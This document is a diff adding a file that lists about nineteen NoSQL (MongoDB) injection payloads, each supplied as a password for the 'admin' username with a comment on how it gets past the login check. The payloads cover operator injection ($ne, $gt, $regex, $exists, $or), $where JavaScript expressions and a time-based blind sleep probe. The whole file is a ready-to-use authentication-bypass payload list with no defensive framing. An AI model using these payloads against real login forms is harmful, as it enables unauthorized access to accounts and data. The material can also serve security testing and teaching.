@@ -1,0 +1,56 @@
+Username: admin
+Password: {"$gt": ""} // Injects a MongoDB query operator that means "greater than an empty string". This often evaluates to true for any non-empty password, bypassing the password check.
+
+Username: admin
+Password: {"$ne": null} // Injects a MongoDB query operator that means "not equal to null". This evaluates to true for any password that is not null, effectively bypassing the password check.
+
+Username: admin
+Password: {"$regex": ".*"} // Injects a regular expression that matches any string. This will match any password, bypassing the password check.
+
+Username: admin
+Password: {"$where": "return true;"} // Injects a JavaScript expression that always returns true. This is a powerful NoSQL injection technique that can bypass authentication if the application uses `$where` clauses.
+
+Username: admin
+Password: {"$where": "this.password.length > 0"} // Injects a JavaScript expression that checks if the password length is greater than 0. This bypasses the password check if any password exists.
+
+Username: admin
+Password: {"$where": "this.username == 'admin' && this.password != null"} // Injects a JavaScript expression that checks if the username is 'admin' and the password is not null. This can bypass authentication for the admin user.
+
+Username: admin
+Password: {"$ne": 1} // Injects a MongoDB query operator that means "not equal to 1". This can bypass password checks if the application expects a specific password value.
+
+Username: admin
+Password: {"$exists": true} // Injects a MongoDB query operator that checks if the password field exists. This bypasses the password check if the field is present.
+
+Username: admin
+Password: {"$not": {"$eq": null}} // Injects a MongoDB query that means "not equal to null". Similar to "$ne": null, this bypasses the password check for any non-null password.
+
+Username: admin
+Password: {"$or": [{}, {"$ne": null}]} // Injects a MongoDB "$or" operator. The first empty object `{}` might match any document, or the second condition `{"$ne": null}` will bypass the password check.
+
+Username: admin
+Password: {"$or": [{"username": "admin"}, {"password": {"$ne": null}}]} // Injects an "$or" condition: either the username is 'admin' or the password is not null. This can bypass authentication for the admin user.
+
+Username: admin
+Password: {"$or": [{"username": "admin"}, {"$where": "1==1"}]} // Injects an "$or" condition: either the username is 'admin' or a JavaScript expression that is always true. This can bypass authentication for the admin user.
+
+Username: admin
+Password: {"$where": "Object.bsonsize(this) > 0"} // Injects a JavaScript expression that checks if the BSON size of the current document is greater than 0. This is a blind injection technique.
+
+Username: admin
+Password: {"$where": "sleep(5000)"} // Injects a JavaScript expression that causes a 5-second delay. This is a time-based blind NoSQL injection technique.
+
+Username: admin
+Password: {"$where": "this.username == 'admin' && this.password == 'password' || 1==1"} // Injects a JavaScript expression that uses logical OR to make the condition always true, bypassing the password check.
+
+Username: admin
+Password: {"$where": "this.username == 'admin' && this.password == 'password' || '1'=='1'"} // Similar to the above, using string comparison for the always-true condition.
+
+Username: admin
+Password: {"$where": "this.username == 'admin' && this.password == 'password' || this.username != 'admin'"} // Injects a JavaScript expression that uses logical OR to bypass the password check if the username is not 'admin'.
+
+Username: admin
+Password: {"$where": "this.username == 'admin' && this.password == 'password' || this.password != 'password'"} // Injects a JavaScript expression that uses logical OR to bypass the password check if the password is not 'password'.
+
+Username: admin
+Password: {"$where": "this.username == 'admin' && this.password == 'password' || this.username == 'admin' && this.password != 'password'"} // Injects a JavaScript expression that uses logical OR to bypass the password check for the admin user.
